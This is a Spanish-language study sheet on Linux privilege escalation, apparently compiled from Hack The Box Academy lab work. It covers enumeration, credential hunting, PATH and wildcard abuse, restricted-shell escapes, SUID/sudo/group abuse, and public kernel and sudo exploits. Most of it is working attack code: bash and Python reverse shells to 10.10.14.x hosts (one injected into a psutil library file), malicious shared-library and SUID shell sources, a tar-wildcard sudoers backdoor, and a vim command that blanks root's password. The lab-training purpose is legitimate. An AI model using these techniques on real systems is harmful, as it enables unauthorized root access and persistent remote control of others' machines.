Por si todo falla: https://github.com/m0nad/awesome-privilege-escalation?tab=readme-ov-file
## Enumeración manual
- Procesos
	```bash
	ps aux | grep sudo
	```
- Usuarios logueados
	```bash
	ps au
	```
- Directorios ssh
	```
	ls -la /home/*/.ssh
	```
- Historial
	```bash
	history
	```
- Privilegios de sudo
	```bash
	sudo -l
	```
- Crontabs
	```bash
	ls -la /etc/cron.daily/
	```
- Discos no montados
	```bash
	lsblk
	```
- Permisos SETUID y SETGID 
	```bash
	# SETUID
	find / -perm -u=s -type f 2>/dev/null
	find / -perm -4000 -type f 2>/dev/null
	# SETGID
	find / -perm -g=s -type f 2>/dev/null
	find / -perm -2000 -type f 2>/dev/null
	# ambos
	find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

	```
- Directorios en los que tenemos permisos de escritura
	```bash
	find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
	```
- Archivos en los que tenemos permisos de escritura
	```bash
	 find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
	```
- Variables de entorno (podrían mostrar información sensible como contraseñas)
	```bash
	env
	```
- Shells en el sistema
	```bash
	cat /etc/shells
	```
- Unidades y recursos compartidos en el sistema (útil si podemos montar algún recurso)
	```
	lsblk
	```
- Sistemas de archivos montados automáticamente al inicio del sistema
	```bash
	cat /etc/fstab
	```
	Más información [[Escalada en montajes peligrosos| aquí]]
- Sistemas de archivos montados en el sistema
	```
	df -h
	```
- Sistemas de archivos desmontados
	```shell-session
	cat /etc/fstab | grep -v "#" | column -t
	```
- Mostrar tablas de enrutamiento
	```bash
	route
	ip r
	netastat -rn
	```
- Servidores DNS (muy útil en AD)
	```bash
	cat /etc/resolv.conf
	```
- Tabla arp
	```
	arp -a
	```
- Permisos en `/etc/shadow`, `/etc/password`, `/etc/sudoers`. Puede ser útil mostrar qué usuarios tienen login shells
	```bash
	grep "*sh$" /etc/passwd
	```
- Grupos del sistema
	```bash
	cat /etc/group
	```
- Listar miembros de grupos -> `getnet`
	```bash
	getnet group sudo
	```
- Archivos y directorios ocultos
	```bash
	# Archivos ocultos
	find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
	# Directorios ocultos
	find / -type d -name ".*" -ls 2>/dev/null
	```
- Archivos temporales
	```bash
	ls -l /tmp /var/tmp /dev/shm
	```
- Interfaces de red
	```bash
	ip a
	```
- hosts
	```bash
	cat /etc/hosts
	```
- Usuarios logueados por última vez
	```
	lastlog
	```
- Usuarios logueados
	```
	w
	```
- Historial
	```bash
	history
	# Buscar archivos tipo history
	find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
	```
- Cron 
	```bash
	ls -la /etc/cron.daily/
	```
- Paquetes instalados
	```bash
	apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
	```
- Versión de sudo
	```bash
	sudo -V
	```
- Binarios
	```bash
	ls -l /bin /usr/bin/ /usr/sbin/
	```
- Oneliner para encontar binarios que podríamos utilizar para explotar privilgeios
	```bash
	for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
	```
- Trazar `syscalls` y depurar funcioanmiento de binarios: `strace`
	```bash
	strace ping -c1 $target
	```
- Archivos de configuración
	```bash
	find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
	```
- Scripts
	```bash
	find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
	```
- Servicios corriendo
	```bash
	ps aux | grep root
	```
- Más información sobre sistema operativos, versión de kernel.

| Comando               | ¿Qué hace?                                                 |
| --------------------- | ---------------------------------------------------------- |
| `cat /etc/os-release` | Muestra info detallada y estructurada del sistema          |
| `cat /etc/issue`      | Muestra banner del sistema (a veces superficial)           |
| `uname -r`            | Versión exacta del **kernel** (clave para exploits) 🔥     |
| `arch` / `uname -m`   | Arquitectura del sistema (`x86_64`, `arm`, etc.)           |
| `hostnamectl`         | (si disponible) Muestra OS, kernel y hardware en resumen   |
| `lsb_release -a`      | (si está instalado) Otra forma de ver versión de la distro |
-  Elementos defensivos que pueden aparecer en el sistema
	- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
	- [iptables](https://linux.die.net/man/8/iptables)
	- [AppArmor](https://apparmor.net/)
	- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
	- [Fail2ban](https://github.com/fail2ban/fail2ban)
	- [Snort](https://www.snort.org/faq/what-is-snort)
	- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

## Credential hunting
Pueden estar en archivos del tipo (`.conf`, `.config`, `.xml`, etc.), shell scripts, bash history, backup (`.bak`)

- Si hay un webserver,  el directorio `/var` suele contener información interesante para cualquier web que esté corriendo en el sistema. 
	```bash
	# Ejemplo interesante en servidor WP
	cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
	```
- Archivos de configuración que puedan contener credenciales, rutas sensibles...
	```bash
	 find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
	```
- Llaves ssh
	```bash
	ls ~/.ssh
	```
## Escalada de privilegios basada en entorno
### Abusando del PATH
- Mostrar `PATH`
	```bash
	env | grep PATH
	echo $PATH
	```
- Añadiendo elementos al PATH
	```bash
	PATH=/tmp:$PAT
	export PATH
	```
- Explotando binarios (ejemplo con `ls`)
	```bash
	touch /tmp/ls
	echo 'echo "PATH ABUSE!!"' > /tmp/ls
	chmod +x /tmp/ls
	```
### Abusando de Wildcards
Un carácter comodín puede sustituir a otros caracteres y el shell lo interpreta antes de ejecutar otras acciones. Ejemplos de comdines

| **Caracter** | **Significado**                                                                                                                                                                            |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `*`          | Un asterisco que puede coincidir con cualquier número de caracteres en un nombre de archivo.                                                                                               |
| `?`          | Coincide con un solo caracter.                                                                                                                                                             |
| `[ ]`        | Los corchetes encierran caracteres y pueden coincidir con cualquiera de ellos en la posición definida.                                                                                     |
| `~`          | Una tilde al comienzo se expande al nombre del directorio de inicio del usuario o puede tener otro nombre de usuario añadido para hacer referencia al directorio de inicio de ese usuario. |
| `-`          | Un guion entre paréntesis indicará un rango de caracteres.                                                                                                                                 |
#### Ejemplo de abuso con `tar`

- Si nos vamos  a  `man tar` observamos lo siguiente
	```bash
	<SNIP>
	Informative output
	       --checkpoint[=N]
	              Display progress messages every Nth record (default 10).
	
	       --checkpoint-action=ACTION
	              Run ACTION on each checkpoint.
	```
	Si a `tar` le pasamos las siguietnes flags: `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh` se ejecutaría el script
- Supgonamos que hemos identificado una tarea programada que hace lo siguiente: 
	```bash
	#
	#
	mh dom mon dow command
	*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
	```
	En este caso el uso de `*` en un comando `tar` sin restricciones, hace que `tar` interprete todas las entradas del directorio como argumentos.
- Podemos explotarlo, añadiendo en el mismo directorio en el que está la tarea `backup.tar.gz` lo siguiente: 
	```bash
	echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
	echo "" > "--checkpoint-action=exec=sh root.sh"
	echo "" > --checkpoint=1
	```
	Esto hará que los archivos que se han creado se interpreten como argumentos de `tar`
- En este caso nuestro nuevo usuario tendría todos los privilegios
### Escapando shells restringidos
Mas info [aquí](https://0xffsec.com/handbook/shells/restricted-shells/)
Son shells en las que al usuario solamente se le permiten ejecutar una serie limitada de comandos. Hay varias formas de intentar escapar este tipo de shells: 
- Listar comandos disponibles
	```bash
	# Muestra todos los comandos disponibles, sin tener en cuenta las restricciones
	compgen -c
	# tabular dos vecess después de escribir rbash
	rbash$ <TAB><TAB>
	# buscar awk, vi, scp,less, env,find
	```
- Command injection
	```bash
	# Ejecuta `pwd` e inyecta su salida como argumento
	ls -l `pwd`
	# Usa sustitución de comandos con $()
	ls -l $(whoami)
	# Si el input no está saneado, ejecuta `id` con `ls`
	ls "-l; id"
	# Otro ejemplo con comando inyectado
	ls "$(echo -l; uname -a)"
	```
- Command substitution
	```bash
	 # Ejecuta `id`, y su salida se pasa como argumento a `ls`
	ls `id`       
	# Ejecuta `hostname` aunque esté prohibido directamente          
	ls $(hostname)
	```
- Command chaining 
	```bash
	# Ejecuta `ls -l` y luego `whoami`
	ls -l; whoami
	# Solo ejecuta `id` si `ls -a` se ejecuta correctamente
	ls -a && id
	# Pasa la salida de `ls` a `cat`
	ls | cat
	```
- Variables de entorno
	```bash
	# Cambia el PATH para que tus binarios se ejecuten antes
	export PATH=/my/bin:$PATH
	# Fuerza bash como shell predeterminada
	export SHELL=/bin/bash
	# Si un programa usa PAGER, puedes forzar bash
	export PAGER=/bin/bash
	# Lanza man, que usará PAGER
	man ls
	```
- Creación de funciones
	```bash
	# Define una función que lanza bash
	mycmd() { /bin/bash; }
	# Ejecuta la función
	mycmd
	# Sobrescribe `ls` para que abra bash
	ls() { /bin/bash; }
	# Ejecuta bash en lugar de ls
	ls
	```
- Spawnear shell desde distintos lenguajes
	```bash
	# Con python
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	# Con perl
	perl -e 'exec "/bin/bash";'
	# Con lua
	lua -e 'os.execute("/bin/bash")'
	```
- Otras ideas para escapar
	```bash
	awk 'BEGIN {system("/bin/bash")}'
	vi :!bash
	env /bin/bash
	find . -exec bash \;
	```
- Ejemplo para leer una flag cuando solo podemos utilizar `echo`
	```bash
	# Mostrar el contenido de una carpeta
	echo /home/htb-admin/*
	# Muestra una flag, que podemos leer del siguiente modo:
	 while read line; do echo "$line"; done < flag.txt
	```
## Permisos especiales
### SUID y GUID
- Permisos SUID y GUID
	```bash
	# SETUID
	find / -perm -u=s -type f 2>/dev/null
	find / -perm -4000 -type f 2>/dev/null
	# Con más detalles y solo propiedad de root
	find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
	# SETGID
	find / -perm -g=s -type f 2>/dev/null
	find / -perm -2000 -type f 2>/dev/null
	# SETGID ó SETUId
	find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
	# SETGID y SETUID
	find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
	```
### Permisos Sudo
- Mostramos los permisos y los abusamos con [GTFOBINS](https://gtfobins.github.io/#)
	```bash
	sudo  -l	
	```
### Grupos privilegiados
- Comprobaremos a los grupos a los que pertenecemos con 
	```bash
	id
	```
#### LXC / LXD
Es un contenedor similar a docker y los miembros de este grupo pueden escalar privilegios creando un contenedor de este tipo como se mostrará a continuación: 
- Descomprimimos la imagen de Alpine
	```bash
	unzip alpine.zip 
	# En principio debería estar en el sistema 
	find / -name "alpine.zip" 2>/dev/nul
	# sino podemos descargarla
	wget https://github.com/saghul/lxd-alpine-builder/archive/master.zip
	```
- Inicializamos el proceso de LXD
	```bash
	lxd init
	```
- Importamos la imagen
	```bash
	lxc image import alpine.tar.gz --alias alpine
	# podemos comprobar que existe con 
	lxc image list
	```
- Lanzar un contenedor con `security.privileged=true`
	```bash
	lxc init alpine r00t -c security.privileged=true
	```
- Montar el sistema de archivos del host 
	```bash
	 lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
	```
- Iniciar el contenedor
	```bash
	lxc start r00t
	lxc exec r00t /bin/bash
	# Si no funciona probar con 
	lxc exec r00t /bin/sh
	```
#### Docker
Más info en [htb](https://academy.hackthebox.com/module/51/section/2411)
##### Docker shared directories - Desde container
- Podemos buscar información que no es común en el contenedor, como `/hostsystem` (ejemplo de htb) y desde allí obtener información sensible o modificar lo que queramos
##### Permisos del grupo docker
- Podemos montar una instancia de docker con `/root` de la máquina host  montado como `/mnt` en la instancia
	```bash
	docker run -v /root:/mnt -it ubuntu
	```
#### Disk
- Tienen acceso a todos los dispositivos dentro de `/dev`, como `/dev/sda1`, que es el dispositivo en el que suele estar montado el sistema operativo. Con `debugfs` se accedería al sistema de archivos
	```bash
	debugfs /dev/sda1
	# Leer archivos
	cat /etc/shadow
	# Mover archivos (permite escribir, pero no modificar directamente)
	write /home/user/hack_passwd /etc/passwd
	```
#### ADM
- No permite escalar privilegios a `/root`, pero permite leer todos los logs alojados en `/var/log`. Algún comando como el siguiente podría ser interesante
	```bash
	grep -iE 'password|passwd|token|login|user|secret' /var/log/* 2>/dev/null
	grep -iE 'sshpass' /var/log/* 2>/dev/null
	```
### Capabilities
Más en [htb](https://academy.hackthebox.com/module/51/section/1844)
 - Enumeración
	```bash
	find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
	```
- Explotación :  [GTOFBINS](https://gtfobins.github.io/#+capabilities)
- Ejemplo :
	```bash
	# Encontramos la siguiente capacidad que permite reescribir archivos
	/usr/bin/vim.basic = cap_dac_override+eip
	# Utilizamos vim para hacer que el usuario root tenga el campo contraseña vacío en /etc/passwd (no pass)
	echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
	```
## Escalada basada en servicios
### Servicios vulnerables
#### Screen
Se pone como ejemplo como explotar esta vulnerabilidad, para la versión `4.05.0` de screen
```bash
screen -v
searchsploit screen 4.5.0
# encontramos un script que nos permite escalar privilegios
searchsploit -x 41154
# Tras pasarlo a nuestro sistema lo ejecutamos y somos root automáticamente
```

### Abusando de crontabs
- Enumeramos con `pspy` y la flag `-pf`, que muestra comandos y eventos del sistema cada segundo (`-i 1000`)
	```shell-session
	./pspy64 -pf -i 1000
	```
- Vemos si tenemos permisos de escritura sobre el archivo con `ls -l` en el archivo o la carpeta
### logrotate
Sirve para evitar que el disco se llene descontroladamente de logs. Se ejecuta periódicamente vía `cron` y la configuración suele estar en `/etc/logrotate.conf`
Para explotar logrotate necesitamos lo siguiente:
- Versión `3.8.6`, `3.11.0`, `3.15.0`, `3.18.0`
- Tener permisos de escritura en los archivos de log
- Debe correr como administrador
Existe un exploit, [logrotten](https://github.com/whotwagner/logrotten)que permite explotar esta vulnerabilidad automáticamente
```bash
# Descargar y compilar
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
# Crear payload (podría ser cualquier cosa además de una revshell)
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
# Buscamos un archivo de log sobre el que tengamos permisos de escritura
find / -type f -name "*.log" -writable 2>/dev/null 
# Ejecutamos el script sobre el archivo encontrado
./logrotten -p ./payload /home/htb-student/backups/access.log
# Escribimos cualquier cosa en el archivo de log
echo "hola" > /home/htb-student/backups/access.log
# Tras ponernos en escucha deberíamos recibir una revshell (a mi me ha dado algunos problemas y he tenido qeu borrar logs, volver a escribir en logs e iniciar sesión paralelamente vía ssh)
```

Más info [video ippsec](https://www.youtube.com/watch?v=RBtN5939m3g&t=4347s)
### Miscelaneo
####  NFS (2049): privilegios débiles 
- Cualquier directorio accesible de NFS puede ser listado remotamente con
	```bash
	 showmount -e $target
	Export list for 10.129.2.12:
	/tmp             *
	```
- Si el NFS tiene habilitada la opción `no_root_squash` , si alguien se conecta siendo root en el sistema anfitrión, lo será en el servidor
- Podemos crear un binario, `shell.c`
	```C
	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdlib.h>
	
	int main(void)
	{
	  setuid(0); setgid(0); system("/bin/bash");
	}
	```
- Compilarlo 
	```bash
	gcc shell.c -o shell
	# O para evitar problemas de compatibilidad
	gcc -static -o shell shell.c
	```
- Y siendo root en nuestra pwnbox hacer lo siguiente:
	```bash
	sudo mount -t nfs $target:/tmp /mnt
	# El contenido de /tmp/ remoto aparecerá en /mnt de nuestra pwnbox
	cp shell /mnt
	chmod u+s /mnt/shell
	```
- Al volver al host que tiene el servidor NFS, 
	```bash
	ls -la /tmp
	...
	-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
	```
- Tras ejecutar `shell` seremos root
	```bash
	./shell
	```
#### Secuestrando sesiones de tmux
Falta: Revisar[apuntes htb]( https://academy.hackthebox.com/module/51/section/478)
## Escalada basada en linux internals
### Kernel exploits
- La escalada se basa en encontrar el exploit, compilarlo y descargarlo
- Debemos buscar vulnerabilidades asociadas a la versión del kernel 

| Comando               | ¿Qué hace?                                                 |
| --------------------- | ---------------------------------------------------------- |
| `cat /etc/os-release` | Muestra info detallada y estructurada del sistema          |
| `cat /etc/issue`      | Muestra banner del sistema (a veces superficial)           |
| `uname -r`            | Versión exacta del **kernel** (clave para exploits) 🔥     |
| `arch` / `uname -m`   | Arquitectura del sistema (`x86_64`, `arm`, etc.)           |
| `hostnamectl`         | (si disponible) Muestra OS, kernel y hardware en resumen   |
| `lsb_release -a`      | (si está instalado) Otra forma de ver versión de la distro |
#### Ejemplo
- Linpeas nos da la salida de un posible exploit , CVE-2018-18955 subuid_shell
- Googleando `subuid_shell github explot` encontramos lo [siguiente](https://github.com/scheatkode/CVE-2018-18955/blob/main/README.md)
- Descargamos el último release en nuestra máquina 
	```bash
	 https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.tar.gz
	```
- Lo subimos a la máquina víctima 
- Descomprimimos (deben estar todos los archivos `.sh`)y ejecutamos 
	```bash
	./exploit.polkit.sh
	```
	que nos convierte en root automáticamente en root
### Bibliotecas compartidas
#### Teoría
- Las shared libraries son librerías que utilizan los binarios ya compiladas, y hay dos tipos: estáticas (`*.a`) que se incluyen dentro del binario a compilar y dinámicas (`*.so`), que se cargan en tiempo de ejecución (el binario solo las referencia)
- Linux busca las librerías `.so` siguiendo este orden
	-  **`LD_PRELOAD`** (si está definido)
	- **`LD_LIBRARY_PATH`** (si está definido)
	- **`RUNPATH`** o **`RPATH`** (si están en el binario)
	- Directorios definidos en `/etc/ld.so.conf` y `/etc/ld.so.conf.d/*`
	- Directorios estándar como `/lib`, `/usr/lib`, `/lib64`
- `LD_PRELOAD`es una variable de entorno que le dice al sistema: “Antes de cargar cualquier librería, **carga esta primero**.” Si tenemos permiso para ejecutar algún binario como sudo, podemos hacer que  ese binario cargue una librería `.so` maliciosa
- Podemos comprobar con la herramienta `ldd` que librerías se ejecutan antes de cargar un binario
#### Ejemplo
- Supongamos que obtenemos lo siguiente al ejecutar `sudo -l`
	```bash
	Matching Defaults entries for daniel.carter on NIX02:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
	
	User daniel.carter may run the following commands on NIX02:
	    (root) NOPASSWD: /usr/sbin/apache2 restart
	```
	No está en gtfobins y está la ruta absoluta, por lo que no podemos intentar algunos ataques ya vistos
- Podemos ejecutar un binario como root y en los defaults tenemos `env_keep+=LD_PRELOAD`, lo que significa que podemos utilizar `LD_PRELOAD`
- Creamos una librería maliciosa
	```C
	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>
	
	void _init() {
	    unsetenv("LD_PRELOAD");
	    setgid(0);
	    setuid(0);
	    system("/bin/bash");
	}
	```
	`init()` se ejecuta automáticamente al cargar la librería
- Compilamos
	```bash
	gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
	```
	- `-fPIC` → posición independiente (requisito para librerías compartidas)
	- `-shared` → indica que es una `.so`
	- `-nostartfiles` → no incluye funciones de inicio estándar (para que `_init` se ejecute lo antes
- Ejecutamos el binario con `LD_PRELOAD`
	```bash
	sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
	```
- Y tenemos `/root`
### Secuestro de objetos compartidos
- Supongamos el caso de que tenemos un binario con el bit SUID, `payroll`
	```bash
	# comprobamos que el binario tiene el bit suid
	ls -la payroll
	-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
	# Comprobamos las librerías que carga el binario
	ldd payroll
	linux-vdso.so.1 =>  (0x00007ffcb3133000)
	libshared.so => /development/libshared.so (0x00007f0c13112000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
	```
- Encontramos alguna librería no estándar, como `libshared.so`
- Runpath también es una ruta embedida dentro del binario que hace que se busquen liberías en esta ruta. Podemos verlo del siguiente modo:
	```bash
	readelf -d payroll  | grep PATH
	
	 0x000000000000001d (RUNPATH)            Library runpath: [/development]
	```
- Si tenemos permisos de escritura en la carpeta `/development`, podemos crear un binario malicioso del siguiente modo: 
	```c
	#include<stdio.h>
	#include<stdlib.h>
	#include<unistd.h>
	
	void dbquery() {
	    printf("Malicious library loaded\n");
	    setuid(0);
	    system("/bin/sh -p");
	} 
	```
- Compilarlo 
	```bash
	gcc src.c -fPIC -shared -o /development/libshared.so
	```
	y al ejecutar payroll, tendremos una shell con permisos de `root`
### Secuestro de librerías de python
#### Importando librerías
- Supongamos que ejecutamos una función en python que tiene permisos SUID/SGID
	```bash
	 ls -l mem_status.py
	
	-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
	```
-  Revisando el código de la función vemos que importa una librería, `psutil`, y carga una función, `virtual_memory()`
	```python
	#!/usr/bin/env python3
	import psutil
	
	available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
	
	print(f"Available memory: {round(available_memory, 2)}%")
	```
- Buscamos donde está definida esa función dentro del paquete
	```bash
	 grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
	```
- Encontrando que en uno de los resultados tenemos permisos de escritura: 
	```bash
	ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
	```
- Añadimos al principio de la función lo siguiente: 
	```python
	def virtual_memory():
	
		...SNIP...
		#### Hijacking
		import os
		os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.170/9001 0>&1'")
		# Alternativa más sigilosa
		import socket, subprocess, os

		s = socket.socket()
		s.connect(("10.10.14.170", 9001))
		os.dup2(s.fileno(), 0)  # stdin
		os.dup2(s.fileno(), 1)  # stdout
		os.dup2(s.fileno(), 2)  # stderr
		subprocess.call(["/bin/bash", "-i"])
	```
- Y tras ejecutar el script como root obtendremos una sesión como tal
### Library path y PYTHONPATH
TODO: en [htb](https://academy.hackthebox.com/module/51/section/1640)
## Vulnerabilidades más recientes
### Sudo
- Vulnerabilidad CVE-2021-3156, que afecta a  las siguientes versiones (entre otras): 
	- 1.8.31 - Ubuntu 20.04
	- 1.8.27 - Debian 10
	- 1.9.2 - Fedora 33
- Podemos encontrar la versión de sudo con
	```bash
	sudo -V | head -n1
	```
- Podemos comprobar si está parcheado del siguiente modo: 
	```bash
	sudoedit -s /
	sudoedit: /: not a regular file # explotable
	usage: sudoedit # no explotable
	```
- Si se cumple que es una verisión conocida podemos escalar del siguiente modo: 

	```bash
	git clone https://github.com/blasty/CVE-2021-3156.git
	cd CVE-2021-3156
	# yo añado el static a la siguiente línea para compilarlo localmente en el Makefile
	gcc -std=c99 -static -o sudo-hax-me-a-sandwich hax.c
	make
	# Una vez instalado correr el script y nos dará versiones que elegir
	./sudo-hax-me-a-sandwich
	# Por ejemplo
	./sudo-hax-me-a-sandwich 1
	```
#### Sudo policy bypass
- Afecta a versiones anteriores de sudo a `1.8.28`
- Si se introduce un id negativo a la hora de ejecutar un comando, este se interpreta como root. 
- Supongamos el siguiente ejemplo: 
	```bash
	sudo -l
	User htb-student may run the following commands on ubuntu:
	    (ALL, !root) /bin/ncdu
	```
- Ejecutar 
	```bash
	sudo -u#-1 /bin/ncdu
	```
	seguido de la letra `b` (gtfobins) nos daría permisos de adminsitrador
### Polkit - pkexec
Es un servicio de autorización que permite la comunicación entre el software del usuario y los componentes del sistema si el software del usuario está autorizado. Viene con programas adicionales, como `pkexec`,  que puede ejecutar un programa con los derechos de otro usuario. 
- Ejemplo
	```bash
	# Funcionamiento generico
	pkexec -u <usuario> <comando>
	# Ejecutaría id como root
	pkexec -u root id
	```
- Podemos comprobar si `pkexec`  vulnerable si la versión es anterior a Enero de 2022 (`0.105-26ubuntu1.2` para ubuntu)
	```bash
	apt list --installed | grep policykit
	```
- Explotación:
	```bash
	git clone https://github.com/arthepsy/CVE-2021-4034.git
	cd CVE-2021-4034
	gcc cve-2021-4034-poc.c -static -o poc
	```
### Dirty pipe
Una vulnerabilidad en el kernel de linux permite a a usuarios no autorizados a escribir en ficheros con permisos de root en linux.
- Comprobamos si es vulnerable
	```bash
	uname - r
	# Todas las versiónes desde 5.8 a 5.17  son vulnerables 
	```
- Descargamos e instalamos el exploit
	```bash
	git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
	cd CVE-2022-0847-DirtyPipe-Exploits
	bash compile.sh
	```
- Explotación 1 :  Modifica `/etc/passwd` y nos da un prompt con privilegios de root
	```bash
	./exploit-1
	```
- Explotación 2: Podemos ejecutar binarios SUID con privilegios de root. Después de elegir el binario SUID (supongamos sudo) ejecutamos el comando: 
	```bash
	./exploit-2 /usr/bin/sudo
	```

--- 
## Chuleta htb

| Command**                                                                           | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ps aux \| grep root`                                                               | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release`                                                              | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll \| grep PATH`                                                   | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |